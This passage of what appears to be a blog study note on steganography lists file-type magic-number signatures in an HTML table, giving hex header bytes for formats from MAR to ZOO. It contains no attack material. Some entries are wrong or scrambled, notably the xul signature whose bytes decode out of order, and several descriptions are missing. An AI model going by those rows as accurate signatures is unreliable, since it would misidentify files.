<td>3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D</td>
<td>Windows Visual Stylesheet XML file</td>
</tr>
<tr>
<td>MAR</td>
<td>4D 41 52 31 00</td>
<td>Mozilla archive</td>
</tr>
<tr>
<td>MAR</td>
<td>4D 41 52 43</td>
<td>Microsoft/MSN MARC archive</td>
</tr>
<tr>
<td>MAR</td>
<td>4D 41 72 30 00</td>
<td>MAr compressed archive</td>
</tr>
<tr>
<td>max</td>
<td>D0 CF 11</td>
<td></td>
</tr>
<tr>
<td>mdb</td>
<td>00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20  44 42</td>
<td>Microsoft Access file</td>
</tr>
<tr>
<td>mdb; mda; mde; mdt</td>
<td>53 74 61 6E 64 61 72 64 20 4A</td>
<td>MS Access</td>
</tr>
<tr>
<td>MDF</td>
<td>00 FF FF</td>
<td></td>
</tr>
<tr>
<td>mdf</td>
<td>00 FF FF FF FF FF FF FF FF FF FF 00 00 02 00 01</td>
<td>Alcohol 120% CD image</td>
</tr>
<tr>
<td>mdf</td>
<td>01 0F 00 00</td>
<td>Microsoft SQL Server 2000 database</td>
</tr>
<tr>
<td>MDI</td>
<td>45 50</td>
<td>Microsoft Document Imaging file</td>
</tr>
<tr>
<td>MDS</td>
<td>4D 45 44</td>
<td></td>
</tr>
<tr>
<td>MID; MIDI</td>
<td>4D 54 68 64</td>
<td>Musical Instrument Digital Interface (MIDI) sound  file</td>
</tr>
<tr>
<td>mkv</td>
<td>1A 45 DF A3 93 42 82 88 6D 61 74 72 6F 73 6B 61</td>
<td>Matroska stream file</td>
</tr>
<tr>
<td>MLS</td>
<td>4D 49 4C 45 53</td>
<td>Milestones v1.0 project management and scheduling  software (Also see “MV2C” and “MV214” signatures)</td>
</tr>
<tr>
<td>MLS</td>
<td>4D 4C 53 57</td>
<td>Skype localization data file</td>
</tr>
<tr>
<td>MLS</td>
<td>4D 56 32 31 34</td>
<td>Milestones v2.1b project management and scheduling  software (Also see “MILES” and “MV2C” signatures)</td>
</tr>
<tr>
<td>MLS</td>
<td>4D 56 32 43</td>
<td>Milestones v2.1a project management and scheduling  software (Also see “MILES” and “MV214” signatures)</td>
</tr>
<tr>
<td>MMF</td>
<td>4D 4D 4D 44 00 00</td>
<td>Yamaha Corp. Synthetic music Mobile Application  Format (SMAF) for multimedia files that can be played on hand-held devices.</td>
</tr>
<tr>
<td>mny</td>
<td>00 01 00 00 4D 53 49 53 41 4D 20 44 61 74 61 62 61  73 65</td>
<td>Microsoft Money file</td>
</tr>
<tr>
<td>MOV</td>
<td>00 00 0F</td>
<td></td>
</tr>
<tr>
<td>MOV</td>
<td>00 00 77</td>
<td></td>
</tr>
<tr>
<td>mov</td>
<td>6D 6F 6F 76</td>
<td>Quicktime</td>
</tr>
<tr>
<td>mov</td>
<td>6D 64 61 74</td>
<td>QuickTime Movie</td>
</tr>
<tr>
<td>mp</td>
<td>0C ED</td>
<td>Monochrome Picture TIFF bitmap file (unconfirmed)</td>
</tr>
<tr>
<td>MP3</td>
<td>49 44 33</td>
<td>MPEG-1 Audio Layer 3 (MP3) audio file</td>
</tr>
<tr>
<td>MP3</td>
<td>FF FB 50</td>
<td></td>
</tr>
<tr>
<td>mp4</td>
<td>00 00 00 18 66 74 79 70 33 67 70 35</td>
<td>MPEG-4 video files</td>
</tr>
<tr>
<td>MPA</td>
<td>00 00 01</td>
<td></td>
</tr>
<tr>
<td>mpg; mpeg</td>
<td>00 00 01 B3</td>
<td>MPEG Movie</td>
</tr>
<tr>
<td>mpg</td>
<td>00 00 01 BA</td>
<td>MPEG</td>
</tr>
<tr>
<td>MSC</td>
<td>3C 3F 78</td>
<td></td>
</tr>
<tr>
<td>msc</td>
<td>3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E  30 22 3F 3E 0D 0A 3C 4D 4D 43 5F 43 6F 6E 73 6F 6C 65 46 69 6C 65 20 43 6F 6E  73 6F 6C 65 56 65 72 73 69 6F 6E 3D 22</td>
<td>Microsoft Management Console Snap-in Control file</td>
</tr>
<tr>
<td>msi</td>
<td>23 20</td>
<td>Cerius2 file</td>
</tr>
<tr>
<td>MSV</td>
<td>4D 53 5F 56 4F 49 43 45</td>
<td>Sony Memory Stick Compressed Voice file</td>
</tr>
<tr>
<td>NES</td>
<td>4E 45 53</td>
<td></td>
</tr>
<tr>
<td>NLS</td>
<td>C2 20 20</td>
<td></td>
</tr>
<tr>
<td>nri</td>
<td>0E 4E 65 72 6F 49 53 4F</td>
<td>Nero CD Compilation</td>
</tr>
<tr>
<td>ntf</td>
<td>1A 00 00</td>
<td>Lotus Notes database template</td>
</tr>
<tr>
<td>nsf; ntf</td>
<td>1A 00 00 03 00 00</td>
<td>Lotus Notes Database/Template</td>
</tr>
<tr>
<td>nsf</td>
<td>1A 00 00 03 00 00 11 00</td>
<td>Notes Database</td>
</tr>
<tr>
<td>nsf</td>
<td>1A 00 00 04 00 00</td>
<td>Lotus Notes database</td>
</tr>
<tr>
<td>ntf</td>
<td>30 31 4F 52 44 4E 41 4E 43 45 20 53 55 52 56 45 59  20 20 20 20 20 20 20</td>
<td>National Transfer Format Map File</td>
</tr>
<tr>
<td>obj</td>
<td>4C 01</td>
<td>Microsoft Common Object File Format (COFF)  relocatable object code file for an Intel 386 or later/compatible processors</td>
</tr>
<tr>
<td>OCX</td>
<td>4D 5A</td>
<td>ActiveX or OLE Custom Control</td>
</tr>
<tr>
<td>OCX</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>OLB</td>
<td>4D 5A</td>
<td>OLE object library</td>
</tr>
<tr>
<td>OLB</td>
<td>4D 5A 90</td>
<td></td>
</tr>
<tr>
<td>org; pfc</td>
<td>41 4F 4C 56 4D 31 30 30</td>
<td>AOL personal file cabinet (PFC) file</td>
</tr>
<tr>
<td>pak</td>
<td>1A 0B</td>
<td>Compressed archive file</td>
</tr>
<tr>
<td>PAT</td>
<td>47 46 31 50 41 54 43 48</td>
<td>Advanced Gravis Ultrasound patch file</td>
</tr>
<tr>
<td>PAT</td>
<td>47 50 41 54</td>
<td>GIMP (GNU Image Manipulation Program) pattern file</td>
</tr>
<tr>
<td>PBK</td>
<td>5B 41 44</td>
<td></td>
</tr>
<tr>
<td>PCB</td>
<td>17 A1 50</td>
<td></td>
</tr>
<tr>
<td>PCS</td>
<td>0A 05 01</td>
<td></td>
</tr>
<tr>
<td>pcx</td>
<td>0A nn 01 01</td>
<td>ZSOFT Paintbrush file(where nn = 0x02, 0x03, or  0x05)</td>
</tr>
<tr>
<td>pcx</td>
<td>0A 05 01 08</td>
<td>PC Paintbrush(often associated with Quake Engine  games)</td>
</tr>
<tr>
<td>pdb</td>
<td>[11 byte offset] 00 00 00 00 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 00 00 00 00</td>
<td>Palmpilot Database/Document File</td>
</tr>
<tr>
<td>PDF</td>
<td>25 50 44</td>
<td></td>
</tr>
<tr>
<td>pdf; fdf</td>
<td>25 50 44 46</td>
<td>Adobe Portable Document Format and Forms Document  file</td>
</tr>
<tr>
<td>pdf</td>
<td>25 50 44 46 2D 31 2E</td>
<td>Adobe Acrobat</td>
</tr>
<tr>
<td>PDG</td>
<td>48 48 02</td>
<td></td>
</tr>
<tr>
<td>pf</td>
<td>11 00 00 00 53 43 43 41</td>
<td>Windows prefetch file</td>
</tr>
<tr>
<td>pic</td>
<td>01 00 00 00 01</td>
<td>Unknown type picture file</td>
</tr>
<tr>
<td>PJT</td>
<td>00 00 07</td>
<td></td>
</tr>
<tr>
<td>PLL</td>
<td>24 53 6F</td>
<td></td>
</tr>
<tr>
<td>PNG</td>
<td>89 50 4E</td>
<td></td>
</tr>
<tr>
<td>PNG</td>
<td>89 50 4E 47</td>
<td></td>
</tr>
<tr>
<td>png</td>
<td>89 50 4E 47 0D 0A</td>
<td>PNG Image File</td>
</tr>
<tr>
<td>png</td>
<td>89 50 4E 47 0D 0A 1A 0A</td>
<td>PNG Image File</td>
</tr>
<tr>
<td>PPC</td>
<td>52 65 63</td>
<td></td>
</tr>
<tr>
<td>PPT</td>
<td>D0 CF 11</td>
<td></td>
</tr>
<tr>
<td>ppt</td>
<td>[512 byte offset] 00 6E 1E F0</td>
<td>PowerPoint presentation subheader (MS Office)</td>
</tr>
<tr>
<td>ppt</td>
<td>[512 byte offset] 0F 00 E8 03</td>
<td>PowerPoint presentation subheader (MS Office)</td>
</tr>
<tr>
<td>PPZ</td>
<td>4D 53 43 46</td>
<td>Powerpoint Packaged Presentation</td>
</tr>
<tr>
<td>prc</td>
<td>42 4F 4F 4B 4D 4F 42 49</td>
<td>Palmpilot resource file</td>
</tr>
<tr>
<td>PRG</td>
<td>23 44 45</td>
<td></td>
</tr>
<tr>
<td>ps</td>
<td>25 21 50 53 2D 41 64 6F 62 65</td>
<td>Postscript</td>
</tr>
<tr>
<td>PSD</td>
<td>38 42 50</td>
<td></td>
</tr>
<tr>
<td>psd</td>
<td>38 42 50 53</td>
<td>Adobe Photoshop image file</td>
</tr>
<tr>
<td>psp</td>
<td>7E 42 4B 00</td>
<td>PaintShop Pro Image File</td>
</tr>
<tr>
<td>pst</td>
<td>21 42 44 4E</td>
<td>Microsoft Outlook Personal Folder file</td>
</tr>
<tr>
<td>pwl</td>
<td>E3 82 85 96</td>
<td>Windows Password</td>
</tr>
<tr>
<td>qbb</td>
<td>45 86 00 00 06 00</td>
<td>Intuit QuickBooks Backup file</td>
</tr>
<tr>
<td>qdf</td>
<td>AC 9E BD 8F</td>
<td>Quicken</td>
</tr>
<tr>
<td>qph</td>
<td>03 00 00 00</td>
<td>Quicken price history file</td>
</tr>
<tr>
<td>qt</td>
<td>6D 64 61 74</td>
<td>Quicktime Movie File</td>
</tr>
<tr>
<td>qxd</td>
<td>00 00 49 49 58 50 52</td>
<td>Quark Express document (Intel &amp; Motorola,  respectively)</td>
</tr>
<tr>
<td>qxd</td>
<td>00 00 4D 4D 58 50 52</td>
<td></td>
</tr>
<tr>
<td>ra</td>
<td>2E 52 4D 46 00 00 00 12 00</td>
<td>Real Audio file</td>
</tr>
<tr>
<td>ra; ram</td>
<td>2E 72 61 FD</td>
<td>Real Audio File</td>
</tr>
<tr>
<td>ra</td>
<td>2E 72 61 FD 00</td>
<td>RealAudio streaming media file</td>
</tr>
<tr>
<td>RAR</td>
<td>52 61 72</td>
<td></td>
</tr>
<tr>
<td>rar</td>
<td>52 61 72 21</td>
<td>RAR Archive File</td>
</tr>
<tr>
<td>RAW</td>
<td>06 05 00</td>
<td></td>
</tr>
<tr>
<td>reg</td>
<td>52 45 47 45 44 49 54 34</td>
<td></td>
</tr>
<tr>
<td>rgb</td>
<td>01 DA 01 01 00 03</td>
<td>Silicon Graphics RGB Bitmap</td>
</tr>
<tr>
<td>RM</td>
<td>2E 52 4D</td>
<td></td>
</tr>
<tr>
<td>rm; rmvb</td>
<td>2E 52 4D 46</td>
<td>Real Media streaming media file</td>
</tr>
<tr>
<td>rpm</td>
<td>ED AB EE DB</td>
<td>RPM Archive File</td>
</tr>
<tr>
<td>RTD</td>
<td>43 23 2B 44 A4 43 4D A5 48 64 72</td>
<td>RagTime document file</td>
</tr>
<tr>
<td>RTF</td>
<td>7B 5C 72</td>
<td></td>
</tr>
<tr>
<td>rtf</td>
<td>7B 5C 72 74 66</td>
<td>Rich Text Format File</td>
</tr>
<tr>
<td>sav</td>
<td>24 46 4C 32 40 28 23 29 20 53 50 53 53 20 44 41 54  41 20 46 49 4C 45</td>
<td>SPSS Data file</td>
</tr>
<tr>
<td>SBV</td>
<td>46 45 44 46</td>
<td>(Unknown file type)</td>
</tr>
<tr>
<td>SCH</td>
<td>2A 76 65</td>
<td></td>
</tr>
<tr>
<td>scm</td>
<td>80 53 43</td>
<td></td>
</tr>
<tr>
<td>SH3</td>
<td>48 48 47 42 31</td>
<td>Harvard Graphics presentation file</td>
</tr>
<tr>
<td>SHD</td>
<td>4B 49 00 00</td>
<td>Windows 9x printer spool file</td>
</tr>
<tr>
<td>sit</td>
<td>53 49 54 21</td>
<td>Stuffit v1 Archive File</td>
</tr>
<tr>
<td>sit</td>
<td>53 74 75 66 66 49 74</td>
<td>Stuffit v5 Archive File</td>
</tr>
<tr>
<td>sle</td>
<td>3A 56 45 52 53 49 4F 4E</td>
<td>Surfplan kite project file</td>
</tr>
<tr>
<td>sle</td>
<td>41 43 76</td>
<td>teganos Security Suite virtual secure drive</td>
</tr>
<tr>
<td>sly; srt; slt</td>
<td>53 52 01 00</td>
<td>Sage sly.or.srt.or.slt</td>
</tr>
<tr>
<td>SMD</td>
<td>00 FF FF</td>
<td></td>
</tr>
<tr>
<td>snm</td>
<td>00 1E 84 90 00 00 00 00</td>
<td>Netscape Communicator (v4) mail folder</td>
</tr>
<tr>
<td>SNP</td>
<td>4D 53 43 46</td>
<td>Microsoft Access Snapshot Viewer file</td>
</tr>
<tr>
<td>sol</td>
<td>00 BF</td>
<td>Adobe Flash shared object file (e.g., Flash cookies)</td>
</tr>
<tr>
<td>spl</td>
<td>00 00 01 00</td>
<td>Windows NT/2000/XP printer spool file</td>
</tr>
<tr>
<td>SCR</td>
<td>4D 5A</td>
<td>Screen saver</td>
</tr>
<tr>
<td>SUB</td>
<td>FF FF FF</td>
<td></td>
</tr>
<tr>
<td>SWF</td>
<td>43 57 53</td>
<td>Shockwave Flash file (v5+)</td>
</tr>
<tr>
<td>SWF</td>
<td>46 57 53</td>
<td>Macromedia Shockwave Flash player file</td>
</tr>
<tr>
<td>sxc</td>
<td>calc</td>
<td>OpenOffice Calc</td>
</tr>
<tr>
<td>sxd</td>
<td>draw</td>
<td>OpenOffice Draw</td>
</tr>
<tr>
<td>sxi</td>
<td>impress</td>
<td>OpenOffice Impress</td>
</tr>
<tr>
<td>sxm</td>
<td>math</td>
<td>OpenOffice Math</td>
</tr>
<tr>
<td>sxw</td>
<td>writer</td>
<td>OpenOffice Writer</td>
</tr>
<tr>
<td>syw</td>
<td>41 4D 59 4F</td>
<td>Harvard Graphics symbol graphic</td>
</tr>
<tr>
<td>TAG</td>
<td>00 00 02</td>
<td></td>
</tr>
<tr>
<td>tar; cpio</td>
<td>30 37 30 37 30 37</td>
<td>CPIO Archive File</td>
</tr>
<tr>
<td>tar.z</td>
<td>1F 9D 90</td>
<td>Compressed tape archive file</td>
</tr>
<tr>
<td>tga</td>
<td>00 00 10 00 00</td>
<td>RLE压缩的前5字节</td>
</tr>
<tr>
<td>TGA</td>
<td>00 00 02</td>
<td></td>
</tr>
<tr>
<td>tga</td>
<td>00 00 02 00 00</td>
<td>未压缩的前5字节</td>
</tr>
<tr>
<td>TIF; TIFF</td>
<td>49 20 49</td>
<td>Tagged Image File Format file</td>
</tr>
<tr>
<td>tif; tiff</td>
<td>49 49 2A</td>
<td>TIFF (Intel)</td>
</tr>
<tr>
<td>tif; tiff</td>
<td>49 49 2A 00</td>
<td>Tagged Image File Format file (little endian, i.e.,  LSB first in the byte; Intel)</td>
</tr>
<tr>
<td>TIF; TIFF</td>
<td>4D 4D 00 2A</td>
<td>Tagged Image File Format file (big endian, i.e., LSB  last in the byte; Motorola)</td>
</tr>
<tr>
<td>tif; tiff</td>
<td>4D 4D 2A</td>
<td>TIFF (Motorola)</td>
</tr>
<tr>
<td>TIF; TIFF</td>
<td>4D 4D 00 2B</td>
<td>BigTIFF files; Tagged Image File Format files &gt;4  GB</td>
</tr>
<tr>
<td>TLB</td>
<td>4D 53 46 54 02 00 01 00</td>
<td>OLE, SPSS, or Visual C++ type library file</td>
</tr>
<tr>
<td>tr1</td>
<td>01 10</td>
<td>Novell LANalyzer capture file</td>
</tr>
<tr>
<td>TST</td>
<td>00 01 00</td>
<td></td>
</tr>
<tr>
<td>TTF</td>
<td>00 01 00</td>
<td></td>
</tr>
<tr>
<td>ufa</td>
<td>55 46 41</td>
<td>UFA Archive File</td>
</tr>
<tr>
<td>VBX</td>
<td>4D 5A</td>
<td>VisualBASIC application</td>
</tr>
<tr>
<td>VCD</td>
<td>45 4E 54 52 59 56 43 44 02 00 00 01 02 00 18 58</td>
<td>VideoVCD (GNU VCDImager) file</td>
</tr>
<tr>
<td>vcf</td>
<td>42 45 47 49 4E 3A 56 43 41 52 44 0D 0A</td>
<td>vCard file</td>
</tr>
<tr>
<td>vob</td>
<td>00 00 01 BA</td>
<td>DVD Video Movie File (video/dvd, video/mpeg)</td>
</tr>
<tr>
<td>VXD, 386</td>
<td>4D 5A</td>
<td>Windows virtual device drivers</td>
</tr>
<tr>
<td>WAV</td>
<td>52 49 46</td>
<td></td>
</tr>
<tr>
<td>wav</td>
<td>57 41 56 45</td>
<td>Wave</td>
</tr>
<tr>
<td>wav</td>
<td>57 41 56 45 66 6D 74</td>
<td>Wave Files</td>
</tr>
<tr>
<td>wb2</td>
<td>00 00 02 00</td>
<td>QuattroPro for Windows Spreadsheet file</td>
</tr>
<tr>
<td>wb3</td>
<td>[24 byte offset] 3E 00 03 00 FE FF 09 00 06</td>
<td>Quatro Pro for Windows 7.0 Notebook file</td>
</tr>
<tr>
<td>wk1; wks</td>
<td>20 00 60 40 60</td>
<td>Lotus 123 v1 Worksheet</td>
</tr>
<tr>
<td>wk1</td>
<td>00 00 02 00 06 04 06 00 08 00 00 00 00 00</td>
<td>Lotus 1-2-3 spreadsheet (v1) file</td>
</tr>
<tr>
<td>wk3</td>
<td>00 00 1A 00 00 10 04 00</td>
<td>Lotus 123 spreadsheet (v3) file</td>
</tr>
<tr>
<td>wk4; wk5</td>
<td>00 00 1A 00 02 10 04 00</td>
<td>Lotus 1-2-3 spreadsheet (v4, v5) file</td>
</tr>
<tr>
<td>wks</td>
<td>0E 57 4B 53</td>
<td>DeskMate Worksheet</td>
</tr>
<tr>
<td>WMA</td>
<td>30 26 B2</td>
<td></td>
</tr>
<tr>
<td>wmf</td>
<td>01 00 09 00</td>
<td>Graphics Metafile</td>
</tr>
<tr>
<td>wmf</td>
<td>01 00 09 00 00 03</td>
<td>Windows Metadata file (Win 3.x format)</td>
</tr>
<tr>
<td>wmf</td>
<td>02 00 09 00</td>
<td>Graphics Metafile</td>
</tr>
<tr>
<td>wmf</td>
<td>D7 CD C6 9A</td>
<td>Windows Meta File</td>
</tr>
<tr>
<td>WMV</td>
<td>30 26 B2</td>
<td></td>
</tr>
<tr>
<td>wp</td>
<td>FF 57 50 43</td>
<td>WordPerfect v5 or v6</td>
</tr>
<tr>
<td>wpd</td>
<td>FF 57 50 43</td>
<td>WordPerfect</td>
</tr>
<tr>
<td>wpg</td>
<td>FF 57 50 47</td>
<td>WordPerfect Graphics</td>
</tr>
<tr>
<td>wri</td>
<td>31 BE</td>
<td>Microsoft Write file</td>
</tr>
<tr>
<td>WRI</td>
<td>31 BE 00</td>
<td></td>
</tr>
<tr>
<td>wri</td>
<td>32 BE</td>
<td>Microsoft Write file</td>
</tr>
<tr>
<td>ws</td>
<td>1D 7D</td>
<td>WordStar Version 5.0/6.0 document</td>
</tr>
<tr>
<td>XBE</td>
<td>58 42 45</td>
<td></td>
</tr>
<tr>
<td>xdr</td>
<td>3C</td>
<td>BizTalk XML-Data Reduced Schema file</td>
</tr>
<tr>
<td>xls</td>
<td>09 02 06 00 00 00 10 00 B9 04 5C 00</td>
<td>MS Excel v2</td>
</tr>
<tr>
<td>xls</td>
<td>09 04 06 00 00 00 10 00 F6 05 5C 00</td>
<td>MS Excel v4</td>
</tr>
<tr>
<td>XLS</td>
<td>D0 CF 11</td>
<td></td>
</tr>
<tr>
<td>xls</td>
<td>D0 CF 11 E0</td>
<td>MS Excel</td>
</tr>
<tr>
<td>xls</td>
<td>[512 byte offset]  09 08 10 00 00 06 05 00</td>
<td>Excel spreadsheet subheader (MS Office)</td>
</tr>
<tr>
<td>XML</td>
<td>3C 3F 78</td>
<td></td>
</tr>
<tr>
<td>xml</td>
<td>3C 3F 78 6D 6C</td>
<td>XML Document</td>
</tr>
<tr>
<td>xml</td>
<td>FF FE 3C 00 52 00 4F 00 4F 00 54 00 53 00 54 00 55 00  42 00</td>
<td>XML Document (ROOTSTUB)</td>
</tr>
<tr>
<td>XMV</td>
<td>00 50 01</td>
<td></td>
</tr>
<tr>
<td>XSL</td>
<td>FF FE 3C</td>
<td></td>
</tr>
<tr>
<td>xul</td>
<td>72 73 69 6F 6E 3D 22 31 3C 3F 78 6D 6C 20 76 65 2E  30 22 3F 3E</td>
<td>XML User Interface Language file</td>
</tr>
<tr>
<td>z</td>
<td>1F 9D</td>
<td>TAR Compressed Archive File</td>
</tr>
<tr>
<td>Z</td>
<td>1F 9D 8C</td>
<td></td>
</tr>
<tr>
<td>ZIP</td>
<td>50 4B 03</td>
<td></td>
</tr>
<tr>
<td>zip; jar; zipx</td>
<td>50 4B 03 04</td>
<td>ZIP Archive</td>
</tr>
<tr>
<td>zip</td>
<td>50 4B 30 30</td>
<td>ZIP Archive (outdated)</td>
</tr>
<tr>
<td>Zip</td>
<td>50 4B 30 30 50 4B 03 04</td>
<td>WINZIP Compressed</td>
</tr>
<tr>
<td>zoo</td>
<td>5A 4F 4F 20</td>
<td>ZOO Archive File</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>隐写</tag>
      </tags>
  </entry>
</search>
